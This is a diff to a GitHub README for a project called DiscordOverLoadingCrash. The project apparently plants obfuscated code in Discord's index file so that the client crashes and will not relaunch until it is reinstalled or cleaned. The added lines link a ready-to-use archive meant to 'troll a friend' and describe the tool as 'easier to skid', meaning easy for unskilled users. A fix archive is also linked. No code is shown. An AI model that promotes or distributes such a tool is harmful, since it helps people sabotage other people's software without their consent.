@@ -2,7 +2,10 @@
 
 Just made [this idea](https://github.com/Wizz1337/DiscordOverLoadingCrash) in ugly but working code, easier to skid :)
 
-[Download the Release(Ready to use)](https://github.com/HideakiAtsuyo/DiscordOverLoadingCrash/releases/tag/1.0)
+
+[See all the Releases files(Ready to use)](https://github.com/HideakiAtsuyo/DiscordOverLoadingCrash/releases/tag/1.0)
+
+If you want to troll a friend or try on yourself => [Click Here](https://github.com/HideakiAtsuyo/DiscordOverLoadingCrash/releases/download/1.0/DOLC.7z)<br>If you want to fix your Discord and don't want to reinstall it => [Click Here](https://github.com/HideakiAtsuyo/DiscordOverLoadingCrash/releases/download/1.0/Fix.7z)
 
 <h3>Just help Discord to crash just in case you don't get it ! You will not be able to launch it again unless you reinstall Discord or remove the obfuscated code from the index file :)</h3>
 
